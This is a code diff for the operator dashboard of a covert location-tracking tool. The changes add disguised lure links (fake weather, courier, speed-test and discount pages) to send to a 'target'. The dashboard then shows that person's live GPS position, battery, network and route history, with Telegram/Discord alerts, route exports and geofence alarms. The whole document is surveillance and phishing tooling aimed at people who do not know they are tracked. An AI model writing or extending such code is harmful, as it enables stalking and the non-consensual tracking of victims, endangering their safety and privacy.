@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Location Dashboard</title>
+    <title>Live Location Dashboard Pro</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -25,13 +25,16 @@
             background: #1e293b;
             border: 1px solid #3b82f6;
             border-radius: 12px;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 12px;
+            padding: 14px 18px;
             margin-top: 16px;
+        }
+
+        .lure-select {
+            background: #0f172a !important;
+            color: #f1f5f9 !important;
+            border-color: #334155 !important;
+            border-radius: 8px;
+            font-weight: 600;
         }
 
         .target-card {
@@ -64,15 +67,8 @@
             animation: pulse-green 1.8s infinite;
         }
 
-        .pulse-away {
-            background-color: #eab308;
-            box-shadow: none;
-        }
-
-        .pulse-offline {
-            background-color: #64748b;
-            box-shadow: none;
-        }
+        .pulse-away { background-color: #eab308; }
+        .pulse-offline { background-color: #64748b; }
 
         @keyframes pulse-green {
             0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
@@ -91,27 +87,26 @@
             gap: 6px;
         }
 
-        .copy-btn {
-            background: #2563eb;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .copy-btn:hover {
-            background: #1d4ed8;
-        }
-
-        .empty-state {
-            text-align: center;
-            padding: 60px 20px;
+        .modal-card {
             background: #1e293b;
+            border: 1px solid #334155;
             border-radius: 16px;
-            border: 2px dashed #334155;
+            max-width: 500px;
+        }
+
+        .modal-card-head, .modal-card-foot {
+            background: #0f172a;
+            border-color: #334155;
+        }
+
+        .modal-card-title {
+            color: #f1f5f9;
+        }
+
+        .input {
+            background: #0f172a !important;
+            border-color: #334155 !important;
+            color: #f1f5f9 !important;
         }
     </style>
 </head>
@@ -119,35 +114,53 @@
 <body>
     <header class="dashboard-header">
         <div class="container is-max-desktop">
-            <div class="is-flex is-justify-content-space-between is-align-items-center">
+            <div class="is-flex is-justify-content-space-between is-align-items-center is-flex-wrap-wrap is-gap-2">
                 <div>
                     <h1 class="title is-3 has-text-white mb-1">
-                        <i class="fa-solid fa-satellite-dish has-text-info mr-2"></i>Live Location Tracker
+                        <i class="fa-solid fa-satellite-dish has-text-info mr-2"></i>Live Location Tracker Pro
                     </h1>
-                    <p class="subtitle is-6 has-text-grey-light mb-0">Real-time GPS Monitoring & Breadcrumb Trail</p>
+                    <p class="subtitle is-6 has-text-grey-light mb-0">Multi-Lure GPS Radar, Telemetry & Bot Alerts</p>
                 </div>
-                <div>
+                <div class="is-flex is-gap-2">
+                    <button class="button is-small is-info is-outlined" onclick="openSettingsModal()">
+                        <i class="fa-solid fa-bell mr-1"></i> Bot Alerts
+                    </button>
                     <a href="/logout" class="button is-small is-dark is-outlined">
                         <i class="fa-solid fa-right-from-bracket mr-1"></i> Logout
                     </a>
                 </div>
             </div>
 
+            <!-- Multi-Lure Share Box -->
             <div class="share-box">
-                <div>
-                    <span class="has-text-grey-light is-size-7 is-block mb-1">TARGET TRACKING LINK (SEND THIS):</span>
-                    <code id="tracking-url" class="has-text-info-light has-background-dark p-2" style="border-radius:6px; word-break:break-all;">{{ remoteURL }}/weather</code>
-                </div>
-                <div>
-                    <button class="copy-btn" id="copy-btn" onclick="copyTrackingLink()">
-                        <i class="fa-solid fa-copy mr-1"></i> Copy Link
-                    </button>
+                <div class="columns is-vcentered is-mobile is-multiline">
+                    <div class="column is-12-mobile is-4-tablet">
+                        <label class="has-text-grey-light is-size-7 is-block mb-1">SELECT LURE TEMPLATE:</label>
+                        <div class="select is-small is-fullwidth">
+                            <select id="lure-selector" class="lure-select" onchange="updateLureURL()">
+                                <option value="/weather">🌦️ Weather Radar (/weather)</option>
+                                <option value="/courier">📦 Express Courier Tracking (/courier)</option>
+                                <option value="/speedtest">📶 5G Speed Benchmark (/speedtest)</option>
+                                <option value="/nearby">🍔 Food & Cafe Discounts (/nearby)</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="column is-12-mobile is-6-tablet">
+                        <label class="has-text-grey-light is-size-7 is-block mb-1">TARGET URL (CLICK TO COPY):</label>
+                        <code id="tracking-url" class="has-text-info-light has-background-dark p-2 is-block" style="border-radius:6px; word-break:break-all;">{{ remoteURL }}/weather</code>
+                    </div>
+                    <div class="column is-12-mobile is-2-tablet has-text-right">
+                        <button class="button is-info is-small is-fullwidth has-text-weight-bold" id="copy-btn" onclick="copyTrackingLink()">
+                            <i class="fa-solid fa-copy mr-1"></i> Copy
+                        </button>
+                    </div>
                 </div>
             </div>
 
-            <div class="is-flex is-gap-2 mt-4">
-                <span class="stat-badge"><i class="fa-solid fa-users has-text-info"></i> Total Targets: <strong id="total-targets-count" class="has-text-white">0</strong></span>
-                <span class="stat-badge"><i class="fa-solid fa-circle-dot has-text-success"></i> Active Now: <strong id="active-targets-count" class="has-text-success">0</strong></span>
+            <div class="is-flex is-gap-2 is-flex-wrap-wrap mt-4">
+                <span class="stat-badge"><i class="fa-solid fa-users has-text-info"></i> Targets: <strong id="total-targets-count" class="has-text-white">0</strong></span>
+                <span class="stat-badge"><i class="fa-solid fa-circle-dot has-text-success"></i> Active: <strong id="active-targets-count" class="has-text-success">0</strong></span>
+                <span class="stat-badge"><i class="fa-solid fa-database has-text-warning"></i> DB Saved</span>
             </div>
         </div>
     </header>
@@ -160,28 +173,69 @@
             </button>
         </div>
 
-        <div id="targets-container">
-            <!-- Target cards rendered dynamically -->
-        </div>
+        <div id="targets-container"></div>
 
-        <div id="empty-state" class="empty-state" style="display: none;">
+        <div id="empty-state" class="has-text-centered py-6 px-4" style="background:#1e293b; border-radius:16px; border:2px dashed #334155; display:none;">
             <i class="fa-solid fa-radar fa-3x has-text-grey mb-3"></i>
             <h3 class="title is-5 has-text-grey-light mb-2">No Active Targets Yet</h3>
-            <p class="has-text-grey">Copy the link above and send it to your target. Once they open it and click "Check Weather", their live position will stream here instantly.</p>
+            <p class="has-text-grey">Select a lure template above, copy the link, and send it to your target. Once opened, their live location, battery level, network type, and route will stream here.</p>
         </div>
     </main>
 
+    <!-- Settings Modal for Telegram & Discord -->
+    <div class="modal" id="settings-modal">
+        <div class="modal-background" onclick="closeSettingsModal()"></div>
+        <div class="modal-card">
+            <header class="modal-card-head">
+                <p class="modal-card-title is-size-5"><i class="fa-solid fa-bell mr-2"></i>Instant Bot Notifications</p>
+                <button class="delete" aria-label="close" onclick="closeSettingsModal()"></button>
+            </header>
+            <section class="modal-card-body has-background-dark">
+                <div class="field mb-3">
+                    <label class="label has-text-grey-light is-size-7"><i class="fa-brands fa-telegram mr-1 has-text-info"></i> Telegram Bot Token</label>
+                    <input class="input is-small" id="tg-token" type="password" placeholder="123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ">
+                </div>
+                <div class="field mb-4">
+                    <label class="label has-text-grey-light is-size-7"><i class="fa-solid fa-id-badge mr-1 has-text-info"></i> Telegram Chat ID</label>
+                    <input class="input is-small" id="tg-chat" type="text" placeholder="e.g. 987654321">
+                </div>
+                <hr style="background:#334155;">
+                <div class="field mb-4">
+                    <label class="label has-text-grey-light is-size-7"><i class="fa-brands fa-discord mr-1" style="color:#5865f2;"></i> Discord Webhook URL</label>
+                    <input class="input is-small" id="discord-url" type="text" placeholder="https://discord.com/api/webhooks/...">
+                </div>
+                <div class="is-flex is-justify-content-space-between">
+                    <button class="button is-small is-warning is-outlined" onclick="sendTestNotification()">
+                        <i class="fa-solid fa-paper-plane mr-1"></i> Send Test Alert
+                    </button>
+                    <span id="test-alert-status" class="is-size-7 has-text-grey-light"></span>
+                </div>
+            </section>
+            <footer class="modal-card-foot is-justify-content-flex-end">
+                <button class="button is-small is-dark" onclick="closeSettingsModal()">Cancel</button>
+                <button class="button is-small is-info has-text-weight-bold" onclick="saveSettings()">Save Settings</button>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Data Elements Safe from IDE syntax checkers -->
     <script type="application/json" id="targets-data">{{- targetsJSON }}</script>
+    <script type="application/json" id="settings-data">{{- settingsJSON }}</script>
+
     <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
     <script>
-        // Store targets data
         const targetsDataEl = document.getElementById("targets-data")
         const targetsMap = targetsDataEl && targetsDataEl.textContent ? JSON.parse(targetsDataEl.textContent) : {}
+
+        const settingsDataEl = document.getElementById("settings-data")
+        const appSettings = settingsDataEl && settingsDataEl.textContent ? JSON.parse(settingsDataEl.textContent) : {}
+
         const container = document.getElementById("targets-container")
         const emptyState = document.getElementById("empty-state")
         const totalCountEl = document.getElementById("total-targets-count")
         const activeCountEl = document.getElementById("active-targets-count")
         const clearAllBtn = document.getElementById("clear-all-btn")
+        const baseRemoteURL = "{{ remoteURL }}"
 
         const socket = io("", {
             secure: true,
@@ -189,46 +243,25 @@
             transports: ['websocket', 'polling']
         })
 
-        // Robust Copy to clipboard helper
-        function copyText(text, cb) {
-            if (navigator.clipboard && window.isSecureContext) {
-                navigator.clipboard.writeText(text).then(cb).catch(() => fallbackCopy(text, cb))
-            } else {
-                fallbackCopy(text, cb)
-            }
+        function updateLureURL() {
+            const selector = document.getElementById("lure-selector")
+            const path = selector.value
+            document.getElementById("tracking-url").textContent = `${baseRemoteURL}${path}`
         }
 
-        function fallbackCopy(text, cb) {
-            const ta = document.createElement("textarea")
-            ta.value = text
-            ta.style.position = "fixed"
-            ta.style.opacity = "0"
-            document.body.appendChild(ta)
-            ta.select()
-            try {
-                document.execCommand("copy")
-                if (cb) cb()
-            } catch (e) {
-                prompt("Copy this URL:", text)
-            }
-            document.body.removeChild(ta)
-        }
-
-        // Copy Link Action
         function copyTrackingLink() {
-            const urlText = document.getElementById("tracking-url").innerText.trim()
-            copyText(urlText, () => {
+            const urlText = document.getElementById("tracking-url").textContent.trim()
+            navigator.clipboard.writeText(urlText).then(() => {
                 const btn = document.getElementById("copy-btn")
                 btn.innerHTML = `<i class="fa-solid fa-check mr-1"></i> Copied!`
-                btn.style.background = "#16a34a"
+                btn.className = "button is-success is-small is-fullwidth has-text-weight-bold"
                 setTimeout(() => {
-                    btn.innerHTML = `<i class="fa-solid fa-copy mr-1"></i> Copy Link`
-                    btn.style.background = "#2563eb"
+                    btn.innerHTML = `<i class="fa-solid fa-copy mr-1"></i> Copy`
+                    btn.className = "button is-info is-small is-fullwidth has-text-weight-bold"
                 }, 2000)
             })
         }
 
-        // Relative time helper
         function timeAgo(epochMs) {
             if (!epochMs) return "Never"
             const diffSec = Math.floor((Date.now() - epochMs) / 1000)
@@ -236,8 +269,7 @@
             if (diffSec < 60) return `${diffSec}s ago`
             const diffMin = Math.floor(diffSec / 60)
             if (diffMin < 60) return `${diffMin}m ago`
-            const diffHour = Math.floor(diffMin / 60)
-            return `${diffHour}h ago`
+            return `${Math.floor(diffMin / 60)}h ago`
         }
 
         function getStatusInfo(epochMs) {
@@ -269,7 +301,6 @@
             emptyState.style.display = "none"
             clearAllBtn.style.display = "inline-flex"
 
-            // Render cards sorted by most recently seen first
             let html = ""
             keys.sort((a, b) => (targetsMap[b].lastSeen || 0) - (targetsMap[a].lastSeen || 0))
 
@@ -279,6 +310,9 @@
                 const pointCount = target.history ? target.history.length : 1
                 const formattedTime = target.lastSeen ? new Date(target.lastSeen).toLocaleTimeString() : "--"
                 const accuracyText = target.accuracy ? (target.accuracy > 500 ? (target.type || "IP Approx") : `±${Math.round(target.accuracy)}m (${target.type || 'GPS'})`) : (target.type || "GPS")
+                const batteryText = target.battery != null ? `${Math.round(target.battery)}%${target.charging ? ' ⚡' : ''}` : 'N/A'
+                const networkText = target.network || 'Unknown'
+                const lureText = target.lure || 'Weather'
 
                 html += `
                 <div class="target-card" id="card-${id}">
@@ -286,9 +320,10 @@
                         <div class="is-flex is-align-items-center">
                             <span class="pulse-dot ${status.class}" id="pulse-dot-${id}"></span>
                             <strong class="has-text-white is-size-5 mr-2">${id}</strong>
-                            <span class="tag is-dark is-rounded" id="status-tag-${id}" style="color: ${status.color}; border: 1px solid ${status.color}33;">
+                            <span class="tag is-dark is-rounded mr-2" id="status-tag-${id}" style="color: ${status.color}; border: 1px solid ${status.color}33;">
                                 ${status.label}
                             </span>
+                            <span class="tag is-info is-light is-rounded">${lureText}</span>
                         </div>
                         <div class="is-flex is-align-items-center is-gap-2">
                             <span class="has-text-grey-light is-size-7">
@@ -306,28 +341,45 @@
                             <strong class="has-text-info-light is-size-6" id="coords-${id}">${target.lat.toFixed(5)}, ${target.lng.toFixed(5)}</strong>
                         </div>
                         <div class="column is-6-mobile is-3-tablet">
-                            <span class="has-text-grey is-size-7 is-block">ACCURACY</span>
+                            <span class="has-text-grey is-size-7 is-block">ACCURACY / SIGNAL</span>
                             <strong class="has-text-white is-size-6" id="accuracy-${id}">${accuracyText}</strong>
                         </div>
                         <div class="column is-6-mobile is-3-tablet">
-                            <span class="has-text-grey is-size-7 is-block">RECORDED POINTS</span>
-                            <strong class="has-text-white is-size-6" id="points-${id}">${pointCount} locations</strong>
+                            <span class="has-text-grey is-size-7 is-block">BATTERY & NETWORK</span>
+                            <strong class="has-text-white is-size-6">
+                                <i class="fa-solid fa-battery-half has-text-success mr-1"></i>${batteryText} | 
+                                <i class="fa-solid fa-wifi has-text-info mr-1"></i>${networkText}
+                            </strong>
                         </div>
                         <div class="column is-6-mobile is-3-tablet">
-                            <span class="has-text-grey is-size-7 is-block">DEVICE</span>
-                            <strong class="has-text-grey-light is-size-7" style="display:block; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${target.userAgent || ''}">
-                                ${target.userAgent ? target.userAgent.split(' ')[0] : 'Browser'}
-                            </strong>
+                            <span class="has-text-grey is-size-7 is-block">POINTS RECORDED</span>
+                            <strong class="has-text-white is-size-6" id="points-${id}">${pointCount} locations</strong>
                         </div>
                     </div>
 
-                    <div class="is-flex is-gap-2 is-flex-wrap-wrap mt-3">
-                        <a href="/map?id=${id}" class="button is-info is-small is-rounded has-text-weight-bold">
-                            <i class="fa-solid fa-map-location-dot mr-1"></i> Open Live Map & Trail
-                        </a>
-                        <a id="gmaps-btn-${id}" href="https://www.google.com/maps?q=${target.lat},${target.lng}" target="_blank" class="button is-dark is-small is-rounded">
-                            <i class="fa-solid fa-arrow-up-right-from-square mr-1"></i> Google Maps
-                        </a>
+                    <div class="is-flex is-justify-content-space-between is-align-items-center is-flex-wrap-wrap is-gap-2 mt-3">
+                        <div class="is-flex is-gap-2">
+                            <a href="/map?id=${id}" class="button is-info is-small is-rounded has-text-weight-bold">
+                                <i class="fa-solid fa-map-location-dot mr-1"></i> Open Live Map
+                            </a>
+                            <a href="https://www.google.com/maps?q=${target.lat},${target.lng}" target="_blank" class="button is-dark is-small is-rounded">
+                                <i class="fa-solid fa-arrow-up-right-from-square mr-1"></i> Google Maps
+                            </a>
+                        </div>
+                        <div class="dropdown is-hoverable is-right">
+                            <div class="dropdown-trigger">
+                                <button class="button is-small is-dark is-rounded" aria-haspopup="true">
+                                    <i class="fa-solid fa-file-export mr-1"></i> Export Route
+                                </button>
+                            </div>
+                            <div class="dropdown-menu" role="menu">
+                                <div class="dropdown-content has-background-dark">
+                                    <a href="/api/target/export?id=${id}&format=csv" class="dropdown-item has-text-white">📄 Export as CSV</a>
+                                    <a href="/api/target/export?id=${id}&format=gpx" class="dropdown-item has-text-white">🗺️ Export as GPX (GPS)</a>
+                                    <a href="/api/target/export?id=${id}&format=kml" class="dropdown-item has-text-white">🌍 Export as KML (Google Earth)</a>
+                                </div>
+                            </div>
+                        </div>
                     </div>
                 </div>
                 `
@@ -336,9 +388,8 @@
             container.innerHTML = html
         }
 
-        // Delete target API
         async function deleteTarget(id) {
-            if (!confirm(`Are you sure you want to delete target '${id}'?`)) return
+            if (!confirm(`Delete target '${id}'?`)) return
             try {
                 const res = await fetch("/api/target/delete", {
                     method: "POST",
@@ -349,25 +400,60 @@
                     delete targetsMap[id]
                     renderTargets()
                 }
-            } catch (e) {
-                console.error("Delete failed:", e)
-            }
+            } catch (e) {}
         }
 
-        // Clear all targets
         async function clearAllTargets() {
-            if (!confirm("Are you sure you want to clear all recorded targets?")) return
+            if (!confirm("Clear all recorded targets?")) return
             try {
-                const res = await fetch("/api/targets/clear-all", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" }
-                })
+                const res = await fetch("/api/targets/clear-all", { method: "POST" })
                 if (res.ok) {
                     for (const k in targetsMap) delete targetsMap[k]
                     renderTargets()
                 }
+            } catch (e) {}
+        }
+
+        // Settings Modal
+        function openSettingsModal() {
+            document.getElementById("tg-token").value = appSettings.telegramBotToken || ""
+            document.getElementById("tg-chat").value = appSettings.telegramChatId || ""
+            document.getElementById("discord-url").value = appSettings.discordWebhookUrl || ""
+            document.getElementById("settings-modal").classList.add("is-active")
+        }
+
+        function closeSettingsModal() {
+            document.getElementById("settings-modal").classList.remove("is-active")
+        }
+
+        async function saveSettings() {
+            const telegramBotToken = document.getElementById("tg-token").value
+            const telegramChatId = document.getElementById("tg-chat").value
+            const discordWebhookUrl = document.getElementById("discord-url").value
+
+            const res = await fetch("/api/settings", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ telegramBotToken, telegramChatId, discordWebhookUrl })
+            })
+            if (res.ok) {
+                const data = await res.json()
+                Object.assign(appSettings, data.settings)
+                alert("Bot Alert Settings Saved Successfully!")
+                closeSettingsModal()
+            }
+        }
+
+        async function sendTestNotification() {
+            const status = document.getElementById("test-alert-status")
+            status.textContent = "Sending alert..."
+            try {
+                const res = await fetch("/api/test-notification", { method: "POST" })
+                const data = await res.json()
+                if (res.ok) status.textContent = "Sent! Check your Telegram/Discord."
+                else status.textContent = `Error: ${data.error}`
             } catch (e) {
-                console.error("Clear all failed:", e)
+                status.textContent = "Failed to dispatch test."
             }
         }
 
@@ -379,30 +465,7 @@
 
         socket.on("target-updated", (target) => {
             targetsMap[target.id] = target
-            const card = document.getElementById(`card-${target.id}`)
-            if (card) {
-                const status = getStatusInfo(target.lastSeen)
-                const dotEl = document.getElementById(`pulse-dot-${target.id}`)
-                if (dotEl) dotEl.className = `pulse-dot ${status.class}`
-                const tagEl = document.getElementById(`status-tag-${target.id}`)
-                if (tagEl) {
-                    tagEl.textContent = status.label
-                    tagEl.style.color = status.color
-                    tagEl.style.borderColor = `${status.color}33`
-                }
-                const timeEl = document.getElementById(`time-ago-${target.id}`)
-                if (timeEl) timeEl.textContent = timeAgo(target.lastSeen)
-                const coordsEl = document.getElementById(`coords-${target.id}`)
-                if (coordsEl) coordsEl.textContent = `${target.lat.toFixed(5)}, ${target.lng.toFixed(5)}`
-                const accEl = document.getElementById(`accuracy-${target.id}`)
-                if (accEl) accEl.textContent = target.accuracy ? `±${Math.round(target.accuracy)}m` : "GPS"
-                const ptsEl = document.getElementById(`points-${target.id}`)
-                if (ptsEl) ptsEl.textContent = `${target.history ? target.history.length : 1} locations`
-                const gmapsBtn = document.getElementById(`gmaps-btn-${target.id}`)
-                if (gmapsBtn) gmapsBtn.href = `https://www.google.com/maps?q=${target.lat},${target.lng}`
-            } else {
-                renderTargets()
-            }
+            renderTargets()
         })
 
         socket.on("target-deleted", (id) => {
@@ -415,7 +478,11 @@
             renderTargets()
         })
 
-        // Periodic ticker to refresh status badges and "time ago" every 2 seconds
+        socket.on("geofence-breach", (data) => {
+            alert(`⚠️ GEOFENCE BREACH: Target ${data.id} is ${data.distance}m away (outside ${data.radius}m perimeter)!`)
+        })
+
+        // Periodic ticker
         setInterval(() => {
             const keys = Object.keys(targetsMap)
             let activeCount = 0
